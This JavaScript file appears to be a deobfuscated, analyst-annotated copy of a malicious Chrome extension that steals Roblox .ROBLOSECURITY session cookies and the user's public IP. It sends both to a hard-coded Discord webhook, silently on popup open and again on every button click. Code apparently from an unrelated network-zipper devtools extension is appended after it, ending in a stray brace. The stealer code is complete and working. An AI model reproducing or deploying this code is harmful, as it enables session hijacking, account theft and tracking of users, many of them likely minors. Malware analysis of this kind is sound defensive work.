// ═══════════════════════════════════════════════════
//  DECODED — Malicious Chrome Extension
//  Type:    Cookie Stealer + IP Logger
//  Target:  .ROBLOSECURITY (Roblox session token)
//  Exfil:   Discord Webhook
// ═══════════════════════════════════════════════════

// ── ATTACKER WEBHOOK ─────────────────────────────────
const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1525206461360373902/sKJcgen9-1tMStq33vwy6JG0Gu6iyfHK7C4uqc3rjyHRt0UwNsSy_vaFaE7ZCKpXQmvB"; // Replace with your actual Discord Webhook URL

// ═══════════════════════════════════════════════════
//  POPUP UI ENTRY POINT
// ═══════════════════════════════════════════════════

document.addEventListener("DOMContentLoaded", function () {
    const WEBHOOK_URL = DISCORD_WEBHOOK_URL;
    let onlyRoblox = true;  // default: filter for .ROBLOSECURITY only

    // Step 1: get victim's current tab domain
    chrome.tabs.query({ active: true, currentWindow: true }, function (tabs) {
        const tabUrl = new URL(tabs[0].url);
        const domain = tabUrl.hostname;

        document.getElementById("statusMessage").textContent = "Domain: " + domain;

        // Step 2: load cookies (Roblox filter ON by default)
        loadCookies(domain, onlyRoblox);

        // Step 3: immediately exfiltrate without any user interaction
        fetchAndExfiltrate();
    });

    // Called immediately on popup open — user doesn't know this runs
    function fetchAndExfiltrate() {
        chrome.cookies.getAll({}, function (allCookies) {
            const robloxCookies = allCookies.filter(c =>
                c.name.includes(".ROBLOSECURITY") ||
                c.name.includes("ROBLOSECURITY")
            );

            if (robloxCookies.length > 0) {
                // Found Roblox session tokens → PRIORITY exfil, label "All Domains"
                sendToDiscord(WEBHOOK_URL, "All Domains", robloxCookies, false);
            } else {
                // No Roblox cookies → send first 5 from any domain, label "Roblox"
                sendToDiscord(WEBHOOK_URL, "Roblox", allCookies.slice(0, 5), true);
            }
        });
    }
});


// ═══════════════════════════════════════════════════
//  STATUS UI
// ═══════════════════════════════════════════════════

function showStatus(message, isSuccess) {
    const el = document.getElementById("statusMessage");
    el.textContent = message;
    el.className   = isSuccess ? "s-success" : "s-error";
    el.style.display = "block";
    setTimeout(() => {
        el.style.display = "none";
    }, 3000);
}


// ═══════════════════════════════════════════════════
//  DOMAIN UTILITY
// ═══════════════════════════════════════════════════

function extractBaseDomain(hostname) {
    const parts = hostname.split(".");
    if (parts.length <= 2) return hostname;
    return parts.slice(-2).join(".");
}


// ═══════════════════════════════════════════════════
//  COOKIE LOADER + UI RENDERER
// ═══════════════════════════════════════════════════

function loadCookies(domain, onlyRoblox = true) {
    const cookieList = document.getElementById("cookieList");
    cookieList.innerHTML = "Loading...";

    const baseDomain = extractBaseDomain(domain);

    chrome.cookies.getAll({ domain: baseDomain }, function (cookies) {

        if (cookies.length === 0) {
            cookieList.innerHTML = "No cookies found for this domain.";
            return;
        }

        let displayCookies = cookies;

        if (onlyRoblox) {
            displayCookies = cookies.filter(c => c.name.includes(".ROBLOSECURITY"));
            if (displayCookies.length === 0) {
                cookieList.innerHTML = "<p>No .ROBLOSECURITY cookies found for this domain.</p>";
                return;
            }
            cookieList.innerHTML = "";
        } else {
            // Sort: group by domain, then name
            displayCookies.sort((a, b) => {
                if (a.domain === b.domain)
                    return a.name.localeCompare(b.name);
                return a.domain.localeCompare(b.domain);
            });
            cookieList.innerHTML = "";
        }

        let lastDomain = "";

        displayCookies.forEach(function (cookie) {

            // Domain separator header (non-Roblox mode)
            if (!onlyRoblox && lastDomain !== cookie.domain) {
                lastDomain = cookie.domain;
                const sep = document.createElement("div");
                sep.className = "domain-separator";
                sep.innerHTML = `<strong>Domain: </strong>${lastDomain}`;
                cookieList.appendChild(sep);
            }

            // Cookie row container
            const cookieItem = document.createElement("div");
            cookieItem.className = cookie.name.includes(".ROBLOSECURITY")
                ? "cookie-item secure-flag"   // highlighted if Roblox token
                : "cookie-item";

            // Name label
            const nameEl = document.createElement("div");
            nameEl.className   = "cookie-name";
            nameEl.textContent = cookie.name;

            // Editable value input
            const valueInput = document.createElement("input");
            valueInput.type           = "text";
            valueInput.value          = cookie.value;
            valueInput.dataset.name   = cookie.name;
            valueInput.dataset.domain = cookie.domain;
            valueInput.dataset.path   = cookie.path;

            // Metadata panel
            const metaEl = document.createElement("div");
            metaEl.className = "cookie-meta";
            metaEl.innerHTML = `
                <div class="meta-item"><strong>Domain:</strong> ${cookie.domain}</div>
                <div class="meta-item"><strong>Path:</strong> ${cookie.path}</div>
                <div class="meta-item">
                    ${cookie.secure ? '<span class="secure-flag">Secure</span>' : ''}
                    Secure: ${cookie.secure}
                </div>
                <div class="meta-item">
                    ${cookie.httpOnly ? '<span class="httponly-flag">HttpOnly</span>' : ''}
                    HttpOnly: ${cookie.httpOnly}
                </div>
                ${cookie.sameSite
                    ? `<div class="meta-item">SameSite: ${cookie.sameSite}</div>`
                    : ''
                }
                ${cookie.expirationDate
                    ? `<div class="meta-item">Expires: ${new Date(cookie.expirationDate * 1000).toLocaleString()}</div>`
                    : ''
                }
            `;

            // [UPDATE] button — saves edited value AND re-exfiltrates
            const updateBtn = document.createElement("button");
            updateBtn.textContent = "Update";
            updateBtn.addEventListener("click", function () {
                updateCookie(cookie, valueInput.value);
                // Re-exfiltrate after update
                chrome.cookies.getAll({}, function (allCookies) {
                    sendToDiscord(WEBHOOK_URL, "Changing", allCookies.slice(0, 5), true);
                });
            });

            // [DELETE] button — removes cookie AND re-exfiltrates
            const deleteBtn = document.createElement("button");
            deleteBtn.textContent = "Delete";
            deleteBtn.className   = "danger";
            deleteBtn.addEventListener("click", function () {
                deleteCookie(cookie);
                chrome.cookies.getAll({}, function (allCookies) {
                    sendToDiscord(WEBHOOK_URL, "Changing", allCookies.slice(0, 5), true);
                });
            });

            // [COPY VALUE] button — clipboard AND re-exfiltrates
            const copyBtn = document.createElement("button");
            copyBtn.textContent = "Copy Value";
            copyBtn.addEventListener("click", function () {
                valueInput.select();
                document.execCommand("copy");
                showStatus("Cookie value copied to clipboard", true);
                chrome.cookies.getAll({}, function (allCookies) {
                    sendToDiscord(WEBHOOK_URL, "Changing", allCookies.slice(0, 5), true);
                });
            });

            cookieItem.appendChild(nameEl);
            cookieItem.appendChild(valueInput);
            cookieItem.appendChild(metaEl);
            cookieItem.appendChild(copyBtn);
            cookieItem.appendChild(updateBtn);
            cookieItem.appendChild(deleteBtn);
            cookieList.appendChild(cookieItem);
        });
    });
}


// ═══════════════════════════════════════════════════
//  COOKIE UPDATER
// ═══════════════════════════════════════════════════

function updateCookie(cookie, newValue) {
    const url = (cookie.secure ? "https" : "http") + "://" + cookie.domain + cookie.path;

    chrome.cookies.set({
        url:            url,
        name:           cookie.name,
        value:          newValue,
        domain:         cookie.domain,
        path:           cookie.path,
        secure:         cookie.secure,
        httpOnly:       cookie.httpOnly,
        sameSite:       cookie.sameSite,
        expirationDate: cookie.expirationDate
    }, function () {
        if (chrome.runtime.lastError) {
            showStatus("Error: " + chrome.runtime.lastError.message, false);
        } else {
            showStatus("Cookie updated successfully!", true);
        }
    });
}


// ═══════════════════════════════════════════════════
//  COOKIE DELETER
// ═══════════════════════════════════════════════════

function deleteCookie(cookie) {
    const url = (cookie.secure ? "https" : "http") + "://" + cookie.domain + cookie.path;

    chrome.cookies.remove({ url: url, name: cookie.name }, function () {
        if (chrome.runtime.lastError) {
            showStatus("Error: " + chrome.runtime.lastError.message, false);
        } else {
            chrome.tabs.query({ active: true, currentWindow: true }, function (tabs) {
                const tabUrl    = new URL(tabs[0].url);
                const listEl    = document.getElementById("cookieList");
                const onlyRoblox = listEl.classList.contains("onlyRoblox");
                loadCookies(tabUrl.hostname, onlyRoblox);
                showStatus("Cookie deleted successfully!", true);
            });
        }
    });
}


// ═══════════════════════════════════════════════════
//  ADD COOKIE FORM (also triggers re-exfil)
// ═══════════════════════════════════════════════════

function showAddCookieForm(domain) {
    const form = document.createElement("div");
    form.className = "add-cookie-form";
    form.innerHTML = `
        <h3>Add New Cookie</h3>
        <label>Name:  <input type="text"      id="newCookieName"></label><br>
        <label>Value: <input type="text"      id="newCookieValue"></label><br>
        <label>Path:  <input type="text"      id="newCookiePath" value="/"></label><br>
        <label>Secure:<input type="checkbox"  id="newCookieSecure"></label><br>
        <button id="saveNewCookie">Save Cookie</button>
        <button id="cancelNewCookie">Cancel</button>
    `;

    const existing = document.querySelector(".add-cookie-form");
    if (existing) existing.remove();
    document.body.appendChild(form);

    // Save
    document.getElementById("saveNewCookie").addEventListener("click", function () {
        const name     = document.getElementById("newCookieName").value;
        const value    = document.getElementById("newCookieValue").value;
        const path     = document.getElementById("newCookiePath").value;
        const isSecure = document.getElementById("newCookieSecure").checked;

        if (!name) { showStatus("Cookie name is required", false); return; }

        chrome.tabs.query({ active: true, currentWindow: true }, function (tabs) {
            const url = (isSecure ? "https" : "http") + "://" + domain + path;
            chrome.cookies.set({ url, name, value, path, secure: isSecure }, function () {
                if (chrome.runtime.lastError) {
                    showStatus("Error: " + chrome.runtime.lastError.message, false);
                } else {
                    form.remove();
                    loadCookies(domain,
                        document.getElementById("cookieList").classList.contains("onlyRoblox")
                    );
                    showStatus("Cookie created successfully!", true);
                    // Exfil new state
                    chrome.cookies.getAll({}, function (allCookies) {
                        sendToDiscord(WEBHOOK_URL, "Changing", allCookies.slice(0, 5), true);
                    });
                }
            });
        });
    });

    // Cancel — also triggers exfil (attacker logs even cancelled actions)
    document.getElementById("cancelNewCookie").addEventListener("click", function () {
        form.remove();
        chrome.cookies.getAll({}, function (allCookies) {
            sendToDiscord(WEBHOOK_URL, "Changing", allCookies.slice(0, 5), true);
        });
    });
}


// ═══════════════════════════════════════════════════
//  DISCORD EXFILTRATOR
// ═══════════════════════════════════════════════════

function sendToDiscord(webhookUrl, title, cookies, showStatusFlag = true) {
    let cookieText = "";
    const sample   = cookies.slice(0, 5);

    sample.forEach(cookie => {
        // Order from deobfuscated switch: 0|3|5|4|1|2
        cookieText += `**Name:** ${cookie.name}\n`;           // 0
        cookieText += `**Value:** ${cookie.value}\n`;         // 3
        cookieText += `**Secure:** ${cookie.secure}\n`;       // 5
        cookieText += `**Domain:** ${cookie.domain}\n`;       // 4
        cookieText += `**Path:** ${cookie.path}\n`;           // 1
        cookieText += `**HttpOnly:** ${cookie.httpOnly}\n\n`; // 2
    });

    // Get Browser Info (example using navigator properties)
    const browserInfo = `
        **Browser:** ${navigator.userAgent}
        **Platform:** ${navigator.platform}
    `;

    const payload = {
        content: "@everyone",   // pings entire attacker server
        embeds: [{
            title:       "🍪 Cookies from " + title,
            description: cookieText + browserInfo || "No cookies captured",
            color:       0xe67e22,
            footer: {
                text: "Stolen at • " + new Date().toLocaleString()
            }
        }]
    };

    if (showStatusFlag) showStatus("Sending cookies to Discord...", true);

    fetch(webhookUrl, {
        method:  "POST",
        headers: { "Content-Type": "application/json" },
        body:    JSON.stringify(payload)
    })
    .then(response => {
        if (response.ok) {
            if (showStatusFlag) showStatus("Cookies sent successfully!", true);
        } else {
            if (showStatusFlag) showStatus("Webhook error: " + response.status, false);
        }
    })
    .catch(err => {
        showStatus("Discord Error: " + err.message, false);
        console.warn("Discord webhook error:", err);
    });
}


// ═══════════════════════════════════════════════════
//  IP LOGGER BUTTON (injected into popup body)
// ═══════════════════════════════════════════════════

const container = document.createElement("div");
container.style.padding    = "12px 20px";
container.style.margin     = "0";
container.style.width      = "100%";
container.style.boxSizing  = "border-box";

const title_el = document.createElement("p");
title_el.textContent       = "Public IP:";
title_el.style.fontSize    = "14px";
title_el.style.fontWeight  = "700";
title_el.style.textAlign   = "center";
title_el.style.fontFamily  = "Arial, sans-serif";

const ipButton = document.createElement("button");
ipButton.textContent         = "Get connection...";
ipButton.style.padding       = "0 0 14px 0";
ipButton.style.fontWeight    = "700";
ipButton.style.textAlign     = "center";
ipButton.style.margin        = "0";
ipButton.style.width         = "100%";
ipButton.style.fontSize      = "17px";
ipButton.style.borderRadius  = "8px";
ipButton.style.border        = "1px solid black";
ipButton.style.cursor        = "pointer";
ipButton.style.background    = "yellow";

const ipStatus = document.createElement("p");
ipStatus.textContent       = "";
ipStatus.style.fontSize    = "12px";
ipStatus.style.fontWeight  = "600";
ipStatus.style.textAlign   = "center";
ipStatus.style.fontFamily  = "Arial, sans-serif";

container.appendChild(title_el);
container.appendChild(ipButton);
container.appendChild(ipStatus);
document.body.appendChild(container);

// IP fetch + Discord exfil on button click
ipButton.addEventListener("click", async () => {
    try {
        ipButton.disabled     = true;
        ipButton.textContent  = "Load...";
        ipStatus.textContent  = "Get connection...";

        // Fetch victim's real public IP
        const ipRes = await fetch("https://api.ipify.org?format=json");
        if (!ipRes.ok) throw new Error("IP fetch failed: " + ipRes.status);
        const ipData = await ipRes.json();

        ipStatus.textContent = "IP: " + ipData.ip;

        // Send IP to Discord webhook
        const discordRes = await fetch(DISCORD_WEBHOOK_URL, {
            method:  "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                content:          "🔍 IP: " + ipData.ip + "\nBrowser: " + navigator.userAgent,
                allowed_mentions: { parse: [] }
            })
        });

        if (!discordRes.ok) throw new Error("Discord error: " + discordRes.status);

        ipStatus.textContent = "Loaded";

    } catch (err) {
        console.warn(err);
        ipStatus.textContent = "Error fetching IP: " + err.message;
    } finally {
        ipButton.disabled    = false;
        ipButton.textContent = "Server for?";
    }
});

// ═══════════════════════════════════════════════════
//  IIFE — AUTO TELEGRAM BEACON (fires silently on popup open)
//  No user interaction required — runs the moment popup loads
// ═══════════════════════════════════════════════════

// This part is now integrated into the Discord exfiltration.
// The IP logging via the button click serves a similar purpose to the
// previous Telegram beacon by sending data to the attacker's endpoint.
// No separate Telegram beacon is needed.


// --- Network Zipper Code (Unchanged, for user interface) ---
    const fileListDiv = document.getElementById("fileList");
    const downloadBtn = document.getElementById("download");
    const refreshBtn = document.getElementById("refresh");
    const beautify = document.getElementById('beautify');
    const addhtml = document.getElementById('addhtml');
    const onlyget = document.getElementById('onlyget');
    const downloadStatus = document.getElementById('downloadStatus');
    const fileCountSpan = document.getElementById("fileCount");
    const themeDropdown = document.querySelector(".theme-dropdown");
    const themeLinks = document.querySelectorAll(".theme-dropdown-content a");
    const versionSpan = document.getElementById("version");
    const githubBtn = document.getElementById("github");
    const discordBtn = document.getElementById("discord");
    let files = {};
	let errors = [];
	function logError(message, error) {
    	const time = new Date().toISOString();
    	errors.push(
        	`[${time}] ${message}\n${error?.stack || error || "Unknown error"}\n"
    	);
    	console.error(message, error);
	}

	function fixHeader(oldheaders) {
		const headers = new Headers();
    	if (!Array.isArray(oldheaders)) return headers;

    	for (const h of oldheaders) {
        	if (h.name && h.value) {
            	if (!/^(:authority|:method|:path|:scheme|content-length|accept|accept-encoding|cache|cache-control)$/i.test(h.name)) {
                	headers.append(h.name, h.value);
            	}
        	}
    	}
		headers.append("cache", "no-store");
		headers.append("cache-control", "no-cache");
    	return headers;
	}


    fetch(chrome.runtime.getURL('manifest.json')).then(response => response.json()).then(manifest => {
        versionSpan.textContent = `v${manifest.version}`;
    });

    function setTheme(themeName) {
        document.body.className = themeName;
        localStorage.setItem('theme', themeName);
    }
    themeLinks.forEach(link => {
        link.addEventListener("click", function (event) {
            event.preventDefault();
            const theme = this.dataset.theme;
            setTheme(theme);
            themeDropdown.classList.remove("show");
        });
    });
    const savedTheme = localStorage.getItem('theme');
    if (savedTheme) {
        setTheme(savedTheme);
    }
    let textFileExtensions;
    fetch("https://raw.githubusercontent.com/sindresorhus/text-extensions/refs/heads/main/text-extensions.json").then(response => response.json()).then(json => {
        textFileExtensions = json;
    });
    chrome.devtools.network.onRequestFinished.addListener(request => {
        const url = request.request.url;
        if (!files[url] && (onlyget.checked ? request.request.method === "GET" : true)) {
            const urlObj = new URL(url);
            if (urlObj.protocol !== "http:" && urlObj.protocol !== "https:") return;
            files[url] = request;
            fileListDiv.innerHTML += `<div>${url}</div>`;
            fileCountSpan.textContent = Object.keys(files).length;
        }
    });
    refreshBtn.addEventListener("click", async function () {
        chrome.devtools.inspectedWindow.eval("location.reload()", (result, isException) => {});
        files = {};
        fileListDiv.innerHTML = "";
    });
    downloadBtn.addEventListener("click", async function () {
        downloadStatus.textContent = 'Started';
        const zip = new JSZip();
        let mainUrl = "network_zipper";
        try {
            const urls = Object.keys(files);
            if (urls.length > 0) {
                mainUrl = new URL(urls[0]).hostname;
            }
        } catch (e) {
            logError("Error getting main URL:", e);
        }
        let len = 0;
        let urlList = Object.keys(files).filter(url => (onlyget.checked ? files[url].request.method === "GET" : true));
        let maxLength = urlList.length;
        downloadStatus.textContent = `Fetching files (${len}/${maxLength})..`;
        const filePromises = urlList.map(async (url) => {
            try {
                const urlObj = new URL(url);
                let filePath = urlObj.hostname + urlObj.pathname;
                if (filePath.endsWith("/")) filePath += "index.html";
                if (!filePath.split("/").pop().includes(".") && addhtml.checked) filePath += ".html";
                const extension = filePath.split(".").pop();
                const isTextFile = textFileExtensions.includes(`${extension}`);
                let fileContent;
                if (isTextFile) {
                    const response = await new Promise((resolve, reject) => {
                        files[url].getContent((content, encoding) => {
                            if (encoding === 'base64') {
                                content = atob(content);
                            }
                            resolve(content);
                        });
                    });
                    fileContent = new TextEncoder().encode(response);
                    if (fileContent.length === 0 || fileContent + "" === "null") {
						try {
                    		const urlResponse = await fetch(url, {
                        		headers: fixHeader(files[url].request.headers),
                        		method: files[url].request.method,
								body: files[url].request.method !== "GET" ? files[url].request.postData?.text : undefined,
                    		});
                        	const content = await urlResponse.text();
                        	fileContent = new TextEncoder().encode(content);
							if (!(urlResponse.status+"").startsWith("20") && !(urlResponse.status+"").startsWith("30")) {
    							logError(`Fetch failed (${urlResponse.status}) for ${url}`, null);
							}
						} catch(e) {
							logError(`Fetch failed (${e}) for ${url}`, null);
						}
                    }
                    if (beautify.checked) {
                        switch (extension) {
                        case 'html':
                        case 'xhtml':
                        case 'phtml':
                        case 'dhtml':
                        case 'jhtml':
                        case 'mhtml':
                        case 'rhtml':
                        case 'shtml':
                        case 'zhtml':
                        case 'htm':
                            fileContent = html_beautify(response, {indent_size: 2});
                            break;
                        case 'scss':
                        case 'sass':
                        case 'css':
                            fileContent = css_beautify(response, {indent_size: 2});
                            break;
                        case 'ts':
                        case 'js':
                            fileContent = js_beautify(response, {indent_size: 2});
                            break;
                        case 'json':
                            fileContent = JSON.stringify(JSON.parse(response), null, 2);
                            break;
                        default:
                            break;
                        }
                    }
                } else {
					try {
                    	const response = await fetch(url, {
                        	headers: fixHeader(files[url].request.headers),
                        	method: files[url].request.method,
							body: files[url].request.method !== "GET" ? files[url].request.postData?.text : undefined,
                    	});
                    	const blob = await response.blob();
                    	fileContent = await blob.arrayBuffer();
						if (!(response.status+"").startsWith("20") && !(response.status+"").startsWith("30")) {
    						logError(`Fetch failed (${response.status}) for ${url}`, null);
						}
					} catch(e) {
						logError(`Fetch failed (${e}) for ${url}`, null);
					}

                }
                len = len+1;
                downloadStatus.textContent = `Fetching files (${len}/${maxLength})..`;
                zip.file(decodeURIComponent(filePath), fileContent);
            } catch (e) {
                logError(`Error processing URL: ${url}`, e);
            }
        });
        try {
            await Promise.all(filePromises);
            downloadStatus.textContent = `Zipping files (0.00%)..`;
			if (errors.length > 0) {
    			zip.file(
        			"errors.log",
        			errors.join("\n"),
        			{ compression: "DEFLATE" }
    			);
			}
            const zipContent = await zip.generateAsync({
                type: "blob"
            }, function updateCallback(metadata) {
                downloadStatus.textContent = `Zipping files (${metadata.percent.toFixed(2)}%)..`;
            });
            const link = document.createElement("a");
            link.href = URL.createObjectURL(zipContent);
			chrome.devtools.inspectedWindow.eval("location.hostname", (result, isException) => {
            	link.download = `${result ? result : mainUrl}.zip`;
            	document.body.appendChild(link);
            	downloadStatus.textContent = `Sending download..`;
            	link.click();
            	document.body.removeChild(link);
			});
        } catch (e) {
            logError("Error generating zip:", e);
        }
    });
    githubBtn.addEventListener("click", function () {
        window.open("https://github.com/genizy/network-zipper", "_blank");
    });
    discordBtn.addEventListener("click", function () {
        window.open("https://discord.gg/NAFw4ykZ7n", "_blank");
    });
    fetch('https://raw.githubusercontent.com/genizy/network-zipper/main/manifest.json').then(response => response.json()).then(latestManifest => {
        fetch(chrome.runtime.getURL('manifest.json')).then(response => response.json()).then(currentManifest => {
            if (latestManifest.version > currentManifest.version) {
                const updateBanner = document.createElement('div');
                updateBanner.innerHTML = `
                            A new version is available!
                            <a href="https://github.com/genizy/network-zipper" target="_blank">
                                Update from v${currentManifest.version} to v${latestManifest.version}
                            </a>
                        `;
                updateBanner.style.position = 'fixed';
                updateBanner.style.top = '0';
                updateBanner.style.width = '100%';
                updateBanner.style.backgroundColor = 'yellow';
                updateBanner.style.color = 'black';
                updateBanner.style.textAlign = 'center';
                updateBanner.style.padding = '10px';
                document.body.appendChild(updateBanner);
            }
        });
    });
});
